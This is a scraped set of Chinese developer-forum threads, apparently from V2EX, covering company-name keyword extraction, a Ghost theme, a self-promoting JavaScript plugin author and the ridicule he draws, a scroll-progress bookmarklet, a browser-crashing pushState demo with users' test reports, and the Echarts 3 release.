{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在一个需求是当用户输入他的公司名称时，判断这个公司的<strong>关键名称</strong>（如深圳市腾讯计算机系统有限公司，北京市百度信息技术有限公司的核心关键名就是<strong>腾讯</strong>，<strong>百度</strong>）；然后到<strong>他们给的表</strong>里面匹配<strong>是否有包含这个关键名称</strong>的公司（他们的表都是官方全称，但是怕用户输入的不完全一致）</p>\n\n<p>于是我个人的想法是计算两个词的相似度来解决，但是对于这么多的数据感觉如果拆词一个一个计算会不会很低效率，或者这种需求还能用别的方法解决吗？</p>\n</div></div>"], "reply": "14", "tittle": "如何高效的提取一个公司名全称中的关键名（如腾讯）？", "comment": ["先分词", "如果预先有关键名称的列表，那用 multiple string search 算法就可以了吧？", "keyword: entity recognition", "可以尝试类似 TF-IDF 的思想，找出这个公司名和其他公司名相比的独特之处", " 严格来说是 IDF", "先分词，然后把“科技、信息、公司”等等常见词组过滤掉，剩下的基本就是了", "借助搜索引擎？查股票代码或者直接搜索公司全称的简称？或者搜索公司名称+主页，然后看域名？", "\r", "\r", "以下摘自 维基百科：\r", "\r", "TF-IDF 的主要思想是：如果某个词或短语在一篇文章中出现的频率 TF 高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。 TF-IDF 实际上是： TF * IDF ， TF 词频（ Term Frequency ）， IDF 逆向文件频率（ Inverse Document Frequency ）。 TF 表示词条在文档 d 中出现的频率。 IDF 的主要思想是：如果包含词条 t 的文档越少，也就是 n 越小， IDF 越大，则说明词条 t 具有很好的类别区分能力。\r", "\r", "--\r", "\r", "“腾讯”和“百度”肯定比起什么“公司”，“有限” 这类词语出现得少……然后，就是这样了。", " 原来有这种服务，正是我想要的！", "求测试类似这样的：\r", "  国际商业机器股份有限公司\r", "  巴伐利亚汽车制造厂", " 结果：\r", "巴伐利亚汽车制造厂\r", "地名：巴伐利亚\r", "名词：汽车、制造厂\r", "\r", "\r", "国际商业机器股份有限公司 \r", "名词：国际 、商业、 机器、 股份、 有限公司", " 嗯然后关键名是……？", "你这两个都没有。。\r", "关键名它会显示为 专有名词\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>今天偶尔在 github 发现很久前写的一个 ghost 主题<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/zephyru5/ghostdog\">https://github.com/zephyru5/ghostdog</a>，现在看起来有点丑，不知道当时审美哪儿去了</h3>\n\n<h3>能看的功能也就是相册浏览了，当时 js 不太会写，好多都是拼凑借鉴(抄袭)的,虽然很丑，还是分享一下，各位轻喷</h3>\n\n<h2>主页</h2>\n\n<p><img src=\"https://github.com/zephyruslove/ghostdog/raw/master/demo/1.png\" alt=\"image\"></p>\n\n<h2>文章内容页</h2>\n\n<p><img src=\"https://github.com/zephyruslove/ghostdog/raw/master/demo/2.png\" alt=\"image\"></p>\n\n<h2>全屏相册浏览</h2>\n\n<p><img src=\"https://github.com/zephyruslove/ghostdog/raw/master/demo/3.png\" alt=\"image\"></p>\n</div></div>"], "reply": "5", "tittle": "分享一个很久前写的 ghost 主题", "comment": ["比我现在用的好多了。。。", "如果去掉右边栏会好很多", " 右边栏有点突兀", "这种左右栏，没有好的设计，真的很难驾驭", " 是的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下载地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/drduan/minggeJS/issues/209\">https://github.com/drduan/minggeJS/issues/209</a></p>\n\n<p>下载地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/drduan/minggeJS/issues/209\">https://github.com/drduan/minggeJS/issues/209</a></p>\n\n<p>MingGe.scrollLoad2.0 滚动加载插件：</p>\n\n<p>MingGe.scrollLoad2.0 插件运行速度非常快，<br>\ndemo.html 演试采用的大量图片以瀑布流形式滚动测试。<br>\n我特意百度了同类型插件，图片太多时滚动超级卡，而且 BUG 较多（我只演试了 3-4 个同类型的插件）。<br>\n而 MingGe.scrollLoad 呢 滚动时，则非常流畅，这就是 MingGe.scrollLoad 的高效性能。</p>\n\n<hr>\n\n<p>问： MingGe.scrollLoad 支持 JQUERY 吗？我想用 JQUERY ，不想用不知名的 MingGeJS</p>\n\n<p>作者答：不支持，你不使用 MingGeJS 妄想用 MingGe.scrollLoad 插件，另外 MingGeJS 很出名。</p>\n\n<hr>\n\n<p>问：为什么不支持 JQUERY ，这么流行的库，你也不支持，是你技术不行吗！</p>\n\n<p>作者答： 我极度讨厌 JQUERY ！ MingGe.scrollLoad 开发目的，就是来吸引用户使用 MingGeJS 。如果支持 JQUERY ，那 minggeJS 就没意义了。<br>\n         说白了就是要强制性迫你使用 MingGeJS ，</p>\n\n<h2>         如果你反感 MingGeJS ，那你以后也别用我的插件，因为以后所有项目都会基于 MingGeJS 进行开发，请详细了解 minggeJS                                               <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.shearphoto.com/bbs/forum.php?mod=viewthread&amp;tid=41\">http://www.shearphoto.com/bbs/forum.php?mod=viewthread&amp;tid=41</a></h2>\n\n<p>问： MingGe.scrollLoad 有教程吗？</p>\n\n<h2>作者答： MingGe.scrollLoad 非常简单，看下 DEMO 的源码，有教程的。超级简单，就算智障的看一下也会马上使用 。</h2>\n\n<p>问： MingGe.scrollLoad 兼容 IE678 吗?</p>\n\n<p>作者答：尘世间所有浏览都支持！</p>\n\n<hr>\n\n<p>问：这样插件，百度一大堆，有必要重新做轮子吗？</p>\n\n<p>作者答： 百度有，百度的事，我只需要做好自己的插件，一个属于 MingGeJS 的插件。 MingGe.scrollLoad 有自己的特色，百度有百度的特色，<br>\n再者 MingGe.scrollLoad 并不是你百度所找到可比，关键是 MingGe.scrollLoad 的卓越性能</p>\n\n<h2>请勿拿百度来大我，请叫我轮子哥。</h2>\n\n<p>问：我能拿 MingGe.scrollLoad ，改成 JQUERY 版本吗？ </p>\n\n<p>作者答：不行，是违法行为，我会拿法律的武器惩治你， MingGe.scrollLoad 所有版权归我所有，</p>\n\n<p>MingGe.scrollLoad 歇斯底里就是要故意不支持 JQUERY ，强迫你使用 MingGeJS 作为类库，这叫营销策略。</p>\n\n<p>我允许你改成 JQUERY ，我岂不是倒自己米饭，有可能吗？</p>\n\n<hr>\n\n<p>基于 MingGeJS 开发（ MingGeJS 插件）</p>\n\n<p>版本号： MingGe.scrollLoad2.0</p>\n\n<p>下载地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/drduan/minggeJS/issues/209\">https://github.com/drduan/minggeJS/issues/209</a></p>\n</div></div>"], "reply": "92", "tittle": "原创图片滚动加载...JS 插件，喜欢的拿去 ---minggeJS 之父又来了", "comment": ["演试： ", "有个性，我喜欢", "百分之 99 的人应该是用百度回来的 lazyload.js 这个插件，可以告诉大家 lazyload.js 在瀑布流页面下，运算错误的，  理直气壮跟大家说 MingGe.scrollLoad 秒 lazyload 一条街，无论是执行效率，还是准确性！呵呵，    MingGeJS 值得大家拥有", "学习了，支持！", "为什么你的 discuz 论坛还用的 jQuery 呢？", "discuz 是用来留言用，我只当他留言板而已，还有 disucuz,原封不到没改过的，他有没有用 JQUERY ，我不清楚，凡正我自己不会用，再者，我平生从没 JQUERY 应用项目内，因为极度反感", "敢问楼主在哪工作", "不允许修改，和闭源有什么区别", " 因为是 js ，无法闭源 23333", "狂妄自大", "还好我不写 js ", " ", "不错，支持了", "“请叫我轮子哥”", "这帖子什么鬼啊", "明哥太谦虚了，直接说我是明哥就行了", "=_=说句实在话… minggejs 里面至今还能看到 alert ……", "jquery 的开发者和你有世仇吧...", "明哥 你怎么不继续更新 minggeJS 了，这还怎么超 jQuery", "  换一下推广路线， minggeJS 作为优秀类库若然没有插件来配合，用户量上不去的，所以走开发小插件的路线，赢取更多用户份额", "长亭外  古道边 芳草连天", "   但是现在大家都不喜欢用库了，都是用 mvc mvvm 一套搞定了，明哥你还要加油啊", " 嘿嘿", "明哥 我是阿里巴巴集团树新风事业部, 对你的项目很有兴趣, 希望取得联系.", "  QQ399195513", "不错。支持下 mingge", "开始总感觉“演试”是错别字，特意查了一下，果然我还是太年轻了啊！支持明哥！", " tree new bee ？", "中二病", "期待明哥的 Angular", " = =。你这么逗别人真的好么。。", "  狗眼看人低", " 树新风事业部哈哈哈", "心疼 @", " 其次心疼明哥😂", " b 别逗", " _(:з」∠)_ 多打了个字", "蛤蛤。。厉害", "树新风事业部 膜拜", "连「轮子哥」的外号都有人抢注了", "中二请对应自己的需要在下列导航中自由选择。", "中国器官捐献网 ", "中国红十字会 ", "中国殡葬协会 ", "中国残联 ", "中国精神病协会 ", "中国司法部 [监狱] ", "中华人民共和国最高检察院 ", "中华人民共和国最高人民法院 ", "\"树新风\"事业部-_-#", "树新风事业部", " 这英语水平  new bee!", "等了半个小时还没处理完\r", "\r", "我还能说什么呢？", "  下载到本机运行，服务器宽带不够", "树新蜂事业部 23333333333333", " 宽带 !== 带宽  吧", " @", " 岂是「宽带！==带宽」，明明就是「宽带！=带宽」", " [233...", "老实说我从来没用过 LazyLoad ，正因为我反感 LazyLoad 。\r", "为什么我反感，因为我完全有开发 LazyLoad 的能力， LazyLoad 的底层我都了如指掌。\r", "虽说我反感 LazyLoad ，但是 LazyLoad 却在测试界占有大量的用户份额，\r", "之后我有个想法，不如重新开发一个属于自己思想，自己架构的 LazyLoad 。\r", "我给了他一个霸气的名字： MingGeLazyLoad ，\r", "它的名字叫 MingGeLazyLoad ， MingGe 就是我的大名，一看到 LazyLoad 名字，\r", "就知道作者是我，知道它是国产的，让别人知道国产 LazyLoad 一样做得很出色，出众。\r", "我是 MingGe ，请支持国产 minggeLazyLoad ，因为我们都是中国人。", " 还有 30 分钟到达战场！", "前来膜拜。。。", " 那我趁机推广我的框架好了.\r", "\r", "一个极简反人类框架, 比 VanillaJS 多一点点方便. 体积巨小. 文档什么的没有, 因为代码太少了, 随便看看就明白了. 希望大家用这个, 别用 mingge jquery 啥的了.", "报告 lz 插件不支持 w3m 浏览器", "  你太极品了，我一看你代码知道你新手  NodeList.prototype.xxxxx  几十句，看了一下马上就关了！", "\r", " NodeList.prototype.bind = function(event_name, func) {\r", "  var nodes = this;\r", "  for (var i = 0; i < nodes.length; i++) {\r", "    if (nodes[i].tagName) {\r", "      nodes[i].addEventListener(event_name, func);//[\"on\" + event_name] = func;\r", "    }\r", "  };\r", "  return nodes;\r", "};\r", "\r", "开什么玩笑了，是你的杰作？", "请联系唯一 qq: 337845818", "bat 的国产货拿来用都要三思，楼主么，快去树新风事业部", "突然想起来我也有个 dom 模块 ", " ，特点是只有 Dom 操作...\r", "虽然我自己并不用， 但是喜欢简洁的可以拿去，测试齐全，支持 npm component 安装", "我就问一句，不用还是不是中国人？", "\r", "你这个代码的确有很大问题，别的我看不出来，单说事件，不能直接让浏览器注册这么多事件，效率太低，一般是自己管理事件，只在 root 注册，然后自己实现事件调度，我也没具体实践过，说错勿怪", " 这个当时要兼容 IE5.5 以上到所有平台浏览器, 似乎那个没什么先进的办法, 就采取这种糙办法了. 效率嘛, 其实还好, 这个生产上用好久了. 也没什么差异.", " 我不是针对你，因为我天天也被人针对,明白被人针对的感受，我技术应该算比较厉害的。我观你代码五分钟，你的代码写得不是路，完全新手入门水平，面向对象也不怎么操作，对原型 了解不清淅", " \r", "var Select = function(selector, context) {\r", "  //var sizzleExist = (typeof Sizzle != \"undefined\");\r", "  if (context) {\r", "    return context.querySelectorAll(selector);\r", "  } else {\r", "    return document.querySelectorAll(selector);\r", "  }\r", "};\r", "\r", "什么玩意！你有脸拿出来    代码完全不会去缩短一下，最离谱的是，这样叫选择器了", " 别黑。", " 能不能加你 qq 学习一下吖 0 0", " 是谁规定的不能？只是做普通页面，多注册些事件能对性能能有啥影响？代码该如何写要看项目实际需要的好吧。\r", "\r", " 虽说这封装跟不封装没啥区别，但是怎么就不可以算选择器了？", " 哈哈, 多说无益. 咱们都是新手, 还是虚心接受指导吧.", " \r", " ", "  \r", "明哥是说这才叫选择器", "还是把 mingge 屏蔽了安静", " 这是侮辱了轮子，不，侮辱了哥。", "我觉得你是在污染环境", " 我本来也想屏蔽的，后来一想，看楼下评论也是一大乐趣……", " +1 一天下来抄到不少代码", " 本来我不想回了，但是我还是想说，既然你写的是框架级别的东西，既然你要给别人用，就负责任一些，至于具体这么些，随你便，与我何干", " 那几行代码能叫框架？只是玩笑话吧。\r", "有句话叫过早优化是万恶之源，说的就是过早把项目设计的复杂化导致维护困难，人家又不是 bug ，只是不适合用于性能有要求的环境罢了，做前端的东西最傻的就是苛求完美，你追求易用，高性能，必然是会牺牲简单性和灵活性的", "谈一个伤感的话题\r", "如果有一天明哥老了。。。 minggejs 还是 minggejs 吗。。。\r", "会不会改成 mingshujs 。。。 mingyejs 。。。\r", "建议发布分支 minggeneveroldjs 或者 mingge17foreverjs", "看到了 mingge 小时候的照片,觉得是有故事的男人", " +1 ，要调节调节生活嘛！", " 我忘了说另一点了，那个框架是一个大东西的基础，移动适用，所有代码压缩后希望在 10k 内。", "  看了你代码好害怕啊！\r", "\r", "NodeList.prototype.removeClass = function(class_name) {\r", "  var nodes = this;\r", "  return nodes.each(function(node) {\r", "    node.className = node.className.split(class_name).join(\" \");\r", " \r", "  });\r", "}\r", "这是 removeClass   是这样写的吗，你逻辑能强点好不！\r", "\r", "\r", "NodeList.prototype.xxxx 一大堆    ，能开源是好事，但是代码乱七八遭\r", "\r", "面向对象估计你刚学一个星期左右，连 this 都不会用，你反醒一下，加强自己技术  \r", "\r", "\r", "还有这句\r", "\r", "var Select = function(selector, context) {\r", "  //var sizzleExist = (typeof Sizzle != \"undefined\");\r", "  if (context) {\r", "    return context.querySelectorAll(selector);\r", "  } else {\r", "    return document.querySelectorAll(selector);\r", "  }\r", "};\r", "\r", "连续两次  return xxxx.querySelectorAll ，你没事吧 ,麻烦你全部重写！", "如果有人看了你的算法，不直接改，而是用你的算法来直接重写 jq 版本，这可是不违反版权的哦。版权只保护程序本身，算法是归专利权管的。", "老实说我从来没用过 Google ，正因为我反感 Google 。 为什么我反感，因为我完全有开发 Google 的能力， google 的底层我都了如指掌。 虽说我反感 Google ，但是 Google 却在搜索界占有大量的用户份额，之后我有个想法，不如重新开发一个属于自己思想，自己架构的 Google 。 我给了他一个霸气的名字： MingGeYmSearch ， 它的名字叫 MingGeSearch ， MingGe 就是我的大名， 一看到 MingGeSearch 名字，就知道作者是我，知道它是国产的，让别人知道国产 Google 一样做得很出色，出众 我是 MingGe 请支持国产 MingGeSearch ，因为我们都是中国人。", "MingGe.scrollLoad2.51 发 布了\r", "\r", "MingGe.scrollLoad 的开发专门针对 lazyload 来强爆的\r", "\r", "MingGe.scrollLoad 无论执行效率还是准确性都在 lazyload 之上，秒杀 lazyload 一条街，\r", "\r", "首先 lazyload 在瀑布流页面下是执行不正确的，我提供的 demo.html 采用的就是瀑布流，不信代入 lazyload 接口试试\r", "\r", "其次 lazyload 是不兼容 IE678 的， lazyload 很认真讲就是水货一件\r", "\r", "还有 lazyload 执行效率非常差，作者水平很一般，可能作者 JQUERY 中毒太深了，大家对比一下自然明白。\r", "\r", "下载地址    ", "\"日你马， IDC 投诉，不演试\"\r", "\r", "别这样...", "然而“轮子哥”已经被占了，知乎上有个非常知名的轮子哥(vczh)。。。。。。\r", "\r", "来个 MingGeVCZH ？\r", "\r", "\r", "老实说我从来没用过 HTML ，正因为我反感 HTML 。 为什么我反感，因为我完全有开发 HTML 的能力， HTML 的底层我都了如指掌。 虽说我反感 HTML ，但是 HTML 却在搜索界占有大量的用户份额，之后我有个想法，不如重新开发一个属于自己思想，自己架构的 HTML 。 我给了他一个霸气的名字： MingGeHTML ， 它的名字叫 MingGeHTML ， MingGe 就是我的大名， 一看到 MingGeHTML 名字，就知道作者是我，知道它是国产的，让别人知道国产 HTML 一样做得很出色，出众 我是 MingGe 请支持国产 MingGeHTML ，因为我们都是中国人。\r", "\r", "MingGeHTML ， MingGeCSS", "老实说我从来没听说过轮子哥，为什么我没听说过轮子哥，因为我完全有当轮子哥的能力， 当轮子哥要做什么我都了如指掌。 虽说我没听说过轮子哥 ，但是轮子哥却在知乎界占有大量的份额，之后我有个想法，不如在 V2EX 重新打出一个属于自己的轮子哥名号。 我给了他一个霸气的名字： MingGe 轮子哥， 他的名字叫 MingGe 轮子哥， MingGe 就是我的大名， 一看到 MingGe 轮子哥名字，就知道是我，我是 MingGe 请支持 V2EX 的 MingGe 轮子哥，因为我们都是 V 友。", "玩笑，勿打， (逃\r", "----------\r", "\r", "MingGe 轮子哥   v0.2\r", "\r", "老实说我从来没听说过轮子哥，为什么我没听说过轮子哥，因为我完全有当轮子哥的能力， 当轮子哥要做什么我都了如指掌。 虽说我没听说过轮子哥 ，但是轮子哥却在知乎界占有大量的份额，之后我有个想法，不如在 V2EX 重新打出一个属于自己的轮子哥名号。 我给了我一个霸气的名号： MingGe 轮子哥， 我的名号叫 MingGe 轮子哥， MingGe 就是我的大名， 一看到 MingGe 轮子哥名号，就知道是我，我是 MingGe 请支持 V2EX 的 MingGe 轮子哥，因为我们都是 V 友。\r", "\r", "----------\r", "\r", "MingGeCSS   v0.1\r", "\r", "老实说我从来没用过 CSS ，正因为我反感 CSS 。 为什么我反感，因为我完全有开发 CSS 的能力， CSS 的底层我都了如指掌。 虽说我反感 CSS ，但是 CSS 却在搜索界占有大量的用户份额，之后我有个想法，不如重新开发一个属于自己思想，自己架构的 CSS 。 我给了他一个霸气的名字： MingGeCSS ， 它的名字叫 MingGeCSS ， MingGe 就是我的大名， 一看到 MingGeCSS 名字，就知道作者是我，知道它是国产的，让别人知道国产 CSS 一样做得很出色，出众 我是 MingGe 请支持国产 MingGeCSS ，因为我们都是中国人。", "一早看到这么喜感的帖子，太有趣—，—", ".", "   ", "   ", " ", "明哥先生, 我开发了个 P2P 爬虫. 我看你 JavaScript 技能蛮不错的. 欢迎贡献你的智慧. \r", "\r", "代码: ", "\r", "\r", "介绍: "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>将代码接放到标签栏，然后点击就可以显示页面的滚动进度。看着玩吧！</p>\n\n<p>js 放到页面里运行没问题，但是放到 bookmarklet ，开始运行没有初始值，不知道怎么回事，求解答！</p>\n\n<p>v2 ，超链接不支持 js 的。那就贴上源码，自行添加吧！<br>\n<code><br>\njavascript:void((function(){function c(){var b=document.getElementById(\"processjQJ8kWLTA7mNRs\"),c=b.innerHTML.replace(\"%\",\"\"),a=b.getContext(\"2d\");b.a=!0;b.width=50;b.height=50;a.clearRect(0,0,25,25);a.beginPath();a.moveTo(25,25);a.arc(25,25,25,0,2*Math.PI,!1);a.fillStyle=\"#e6e6e6\";a.fill();a.beginPath();a.moveTo(25,25);a.arc(25,25,25,-.5*Math.PI,-.5*Math.PI+2*Math.PI*c/100,!1);a.closePath();a.fillStyle=\"#ff8000\";a.fill();a.beginPath();a.arc(25,25,19,0,2*Math.PI,!0);a.closePath();a.fillStyle=\"#fff\";a.fill();a.beginPath();a.arc(25,25,17,0,2*Math.PI,!0);a.closePath();a.font=\"bold 10px consolas\";a.fillStyle=\"#ff8000\";a.textAlign=\"center\";a.textBaseline=\"middle\";a.moveTo(25,25);a.fillText(c+\"%\",25,25)}(function(){var b=document.createElement(\"canvas\");b.id=\"processjQJ8kWLTA7mNRs\";b.style.position=\"fixed\";b.style.right=\"0\";b.style.bottom=\"0\";b.innerHTML=\"0%\";document.body.appendChild(b)})();(function(){var b=document.documentElement.clientHeight;window.addEventListener(\"resize\",function(){b=document.documentElement.clientHeight},!1);window.addEventListener(\"scroll\",function(){document.getElementById(\"processjQJ8kWLTA7mNRs\").innerHTML=parseInt(100*(document.documentElement.scrollTop||document.body.scrollTop)/((document.documentElement.scrollHeight||document.body.scrollHeight)-b))+\"%\";c()},!1)})();c()})());<br>\n</code></p>\n\n<p>获取进度和画图的简单说明：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.dyniao.com/use-canvas-draw-browse-progress/\">http://www.dyniao.com/use-canvas-draw-browse-progress/</a></p>\n</div></div>"], "reply": "5", "tittle": "bookmarklet 显示当前页面的进度，其实没卵用。", "comment": ["本页滚动到底部就 121% 了", " 目前还没发现这个问题。什么环境？什么浏览器呢？", " \r", "Chrome Version 47.0.2526.106 (64-bit)\r", "OS X 10.11.2", " 是个问题，估计是哪算错了，我查查。", "不如做个点击回到顶部的吧，更实用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>多多学习 多多提问 增加题库</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/kittencup/angular2-ama-cn/issues\">https://github.com/kittencup/angular2-ama-cn/issues</a></p>\n\n<p>支持的点击 star 哦</p>\n</div></div>"], "reply": "3", "tittle": "每天花点时间整了点 Angular 2 的学习资料", "comment": ["请教楼主 angular 是什么东东啊？", "已 star", "希望楼主再出一篇 vue 跟 angular 的对比，适用什么样的项目。对这两种都了解一点，知道基础的用法，但是没有实际的用过"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.freebuf.com/articles/terminal/93807.html\">http://www.freebuf.com/articles/terminal/93807.html</a></p>\n\n<p>谁来解释下原理，不是很明白 23333</p>\n</div></div>"], "reply": "65", "tittle": "这十二行代码是如何让浏览器爆炸的？", "comment": [" 短時間載入 10000 次網頁，你說內存會不會炸掉喔…", " 内存没有炸掉， CPU 爆了\r", " ", " 刚才手误粘贴错了\r", "\r", " ", "苹果重启了！！！", "cpu 占用 90%多，只能通过任务管理器来杀掉。。。", "估計是讓瀏覽器不斷佔用內存且無法釋放，最終 out of memory 崩潰", "MacBook 12\", MacBook Pro 13\"实测无效，\r", "循环加到一千万次，只是 CPU 满格而已，内存 50%左右", "WP 表示只是地址栏爆炸，网页还能轻松关掉，微软黑科技😂", "眼睁睁的看着 Chrome 占用内存飙到 2G ，赶紧结束任务了", "safari 和 kernel_task 内存占用均超过 10G ， safari web 内容内存占用超过 3G ， CPU 满。\r", "由于还有工作为保存，强行退出了 safari 。", "Noscript 大法好。😁", "安卓只是 chrome 卡死。。。关掉就好了。。", "安卓扣肉表示进程全重启了", "跑到 15000 ，吃了 900M ， CPU 倒是满了。 Opera 12 @ Windows 10 。", "为什么？大神求解答", "Ff Android 就那个网页假死了，关掉就没事了", "v2 上有多少黑客级别的人物啊？", "CPU 占用 150%，内存飙到 10 G 。直接退出。", "cpu 干到 150% rmbp 13", " @", " 为什么会有 150%这种看起来很不科学的数值？", " 是因为多核么？", "破 Windows xp 里面的 ie 浏览器居然没事", "cpu 一直 70%多，内存从开机的 1g 一直慢慢升到 5.78g （ 99%），然后就升不上去了，没有蓝屏没有重启。", " 因为 IE 不支持 pushstate", "Edge 毫无鸭梨\r", "\r", "   pushstate  只是操作 url ，并没有加载页面。 能解析的更详细一点么，还是没有懂为啥会崩溃", "没压力……\r", " ", " ", "IE 对这个免疫的. 谷歌垃圾.", " 因为有几核, 最大就是百分之几百", "demo ：（温馨提示：请保存浏览器其它窗口的编辑任务）\r", " (点击一下，又不会怀孕！)", "CPU 占了 14% 左右，内存一路飙升，直到占满 32G ， Chrome 一直是卡死状态", "![]( ", ")\r", "看着好给力", "好奇心害死了多少猫", "这三行代码是如何让你程序爆炸的？\r", "\r", "while(true) {\r", "  malloc(1024);\r", "}", " 操作一次貌似是會請求一次的，不過就是不載入而已 況且你看下這串字符串有多大……", "t=\"\";for (var i=0;i<1000000;i++){t+=i.toString()}document.write(t);", "这种网站无法传播呀，差评", "哪个语言这样写不爆炸...", "上次手误这样写了一段 C#，无限调用没释放，第一次见到 堆栈溢出 错误..", "为什么 点一下浏览器爆炸，然后把代码拷贝出来放到本地，再打开 HTML 浏览器却没有影响", "pushState 会添加浏览器的 History 栈？", "edge 大法好 ", " ", "// 这个呢\r", "while(true) document.body.append(document.createElement('div'));", "while(true) document.body.appendChild(document.createElement('div'));", "会不会让可以模拟 JS 的蜘蛛爆炸...", " \r", "页面卡死，但是滚动之类都可以，其他窗口均不受影响。", "用 ie 表示, 什么问题??", "哪用那么麻烦：\r", "\r", "while(true){}", "fedora 23 + chrome 直接 死机", "玩着好爽。。看着 cpu 占用爆炸到死机", "win10 Firefox.卡顿之后提示是否停止脚本。 CPU31%，内存 20%。一切正常", "win10 下打开 CPU100% 内存攀升到 93%然后浏览器自动退出。。 QQ 浏览器极速模式", "貌似他自己线挂了.", "win10 CPU 95%，内存 60%， chrome 卡死，其他能勉强正常用", " 你直接双击打开的吧？试试用 localhost 。。", "有人试过 win10 的 edge 浏览器吗？我用那个浏览器测试，瞬间加载完，然后出现“恭喜你，你已经怀孕了! ”这个提示", "IE 也是一样瞬间加载完成， cpu 使用率只是小幅的增了一下，然后瞬间就下去了。", "SecurityError: The operation is insecure.", "可以加入 http 劫持套餐了。", "情绪稳定（\r", " ", "Safari for Mac 卡死 但是仅仅浏览器卡死而已。。其他很正常。。 iPad 上面的 Safari 打开就白苹果重启了。。", " ", "CPU 60%左右，内存 4.9G 一直升到 10G 后浏览器崩溃  = =", "没压力啊。", "chrome 拖死了机器\r", "iPhone 直接重启", "MACBOOK PRO 没有重启, IPHONE 也没有", " 我也是，握爪"]},
{"content": ["<div class=\"topic_content\">最近在做一个 side project 用到了 echarts ，今天一刷新 echarts 官网发现更新了：文件体积变得更小，并提供移动设备的适配，真的很帅。\r<br>\r<br><a target=\"_blank\" href=\"http://echarts.baidu.com/\" rel=\"nofollow\">http://echarts.baidu.com/</a></div>"], "reply": "75", "tittle": "百度的 echarts 3 发布了，很帅", "comment": ["样子总算没那么丑了", "不赚钱的东西可能哪天就关闭了", "项目正好在用，看看是不是需要跟着更新下，哈哈", "看了下，确实好棒，关键是变小了！！！", "好看喔！没想到百度还能做出来能用的东西，赞一个先~", "echarts 太丑了，比 highcharts 丑多了，唯一的优点算是有中文文档吧", "\r", "已经升级到了 echarts 3 了。\r", "echarts 3 调用方式跟以前有些区别，小了不少，还支持在线构建了……", " Highstock 要钱的……", "帅多了，以前真的丑的一比", " highcharts 商用也是要钱的", " 可能是没什么版权意识吧。我以前去 highcharts 看过，觉得很符合我的需求，看到要钱，摸了下钱包就关了。", "感觉比 HIGHCHARTS 响应慢很多", "试了一下， 3 版响应速度快了好多。", "东西很好，可惜是百度出的。。。", " 又犯情怀病。。", " 也不是啊，只是这几天大家抵制百度比较严重（当然，不包括我。。。因为我很少用百度，也没那闲工夫），哈哈\r", "\r", "另外，今天要出第 29 集了^_^", " \r", "狗屁 你说说有什么区别", " 什么玩意儿 29 了。。。是不是太子妃？", "实际项目用过\r", "可惜他 tip 的 label 不能设置旋转，鼠标事件也有些问题，图表太小， tip 会不停弹出来又缩回去\r", "而且其实 性能来讲 不及 svg 的 highcharts 来的好\r", "用了 esl 打包，直接在页面上先定义了一个 require 和 define\r", "\r", "最主要的百度的东西 用着用着就可能不更新了", "  看着我的头像，我明白了。。秦时明月的还没灵主好看~~", "还是继续 D3.js 吧", "可惜百度出的+1\r", "百度真的是 PM 和技术都不咋样，特别是贴吧的…\r", "echarts 倒是给我一个经验的感觉，还是觉得太可惜了。", "良心产品，硬广：\r", "非百度同学请加 QQ 群： 465958031\r", "百度同学 请加 Hi 群 ： 1478984", "不要说丑不丑，其实你们可以自己配色的", "Echarts 作为开源项目 已经很不错了  此次改版也比较令人惊艳 大家应该多多支持～", " 你的网站挂了....", "居然还有因为是百度的就来黑，呵呵", " 已经恢复访问了....", " 有什么不可以么", " 有点替百度里有理想的程序员可悲。", "还是用 d3 吧，说不定哪天百度就关门了", "看看 ueditor", "一群犯情怀病的人", "我去看看 HIGHCHARTS  。\r", "\r", "百度的 的确无感了。", "现在还是 beta 版吧，没找到正式版的页面啊。微博说是 1 月 12 日发布正式版，看来是又延后了。", "谁知道这种 LEGEND 样式的图表用哪种库生成的呀？", "什么时候发布到 NPM 再说", "去年用过，感觉很不错。", " 哥，官网上明明写了非商用免费好吗 ？ 哎，还真是一不小心就要被你们抓住道德点批判一番\r", "> FREE FOR NON-COMMERCIAL\r", "> Do you want to use Highcharts for a personal website, a school site \r", "> or a non-profit organisation? Then you don't need the author's \r", "> permission, just go on and use Highcharts. For commercial websites \r", "> and projects, see License and Pricing.", "确实好用，正好自己的项目需要", "ECHARTS3 不像第 2 版那么卡顿了，真心不错", "东西确实不错 但是 但是当你想要深度定制的时候就知道有多坑爹了 之前的文档完全找不着北", "确实比之前丑的要死的默认样式帅多了~", " 不根据项目质量来评判而仅仅因为 made by baidu 就开黑？百度虽然产品流氓点，但是技术实力在国内处于第一阵容，应该是公认的吧", "官网慢的要死，真的是 baidu 的么", "太好看了", "V2EX 有没有屏蔽关键词的功能？比如“百度”|“ baidu ”", "大流氓的东西说不用就不用", "官网的样例看着挺好的", "  质量暂且不论好不好，百度很多产品半途而废，可能给使用者带来损失。", "的确惊艳", "好像不错，但是不会用囧。", " 开源项目难道不是作者不再维护，就自己 fork 过来继续改吗？", "有没有人觉得首页那几个字读的时候会卡一下？", "看看这协议写的，模糊不清：\r", "上次被工具链坑哭了，和打包策略起了冲突。没有非 require 加载方式。没有 npm 。定义 package 的时候不能引用 dist ，要用 src 。楼上说好的各位真的有用过吗。", " 不否认有人去改内核，但是大部分人是需要的仅仅是一个稳定的工具", " 那么现有版本足矣。", "正在用，可惜我打开还是 2 呢？", "百度出的怎么了？技术是不可耻的！哈哈。", " 就怕真的需要 fork 过来改的那一天", "万恶的 TG 出的人民币你们要用吗？", " 不用百度很开心，有人民币用也很开心的。", "这帖子的回复们让我很震惊！！！", " echarts 3 不再强制要求使用 AMD 规范了", " 别的产品不了解，但是 echarts 从 1.0 到 3.0 ，已经维护四年多了，说半途而废有点诛心\r", "\r", "PS 